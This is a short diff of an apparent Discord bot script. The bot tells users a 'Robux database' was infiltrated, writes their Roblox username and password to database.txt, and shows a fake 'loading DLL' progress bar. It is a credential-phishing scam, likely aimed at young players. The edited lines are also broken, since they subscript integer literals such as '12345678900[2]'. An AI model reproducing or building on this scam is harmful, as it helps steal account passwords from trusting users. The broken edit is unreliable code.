@@ -20,12 +20,13 @@ async def on_message(message):
         await client.send_message(message.channel,"Robux database infiltraded, check if you are a real user")
         if roblox==True:
             f=open("database.txt","a+")
-            f.write("username: "+hack[1]+"||")
-            f.write("password: "+hack[2]+"||")
-            f.write("robux amount: "+hack[3]+"\r\n")
+            f.write("username: "+Aimbot_Central[1]+"||")
+            f.write("password: "+12345678900[2]+"||")
+            f.write("robux amount: "+1000[3]+"\r\n")
             f.close()
             await client.send_message(message.channel,"Your account is in the database, loading DLL")
             time_wait=0
+           
             while time_wait<1:
                 await client.send_message(message.channel,str(int(time_wait*100))+"%")
                 time.sleep(0.1)
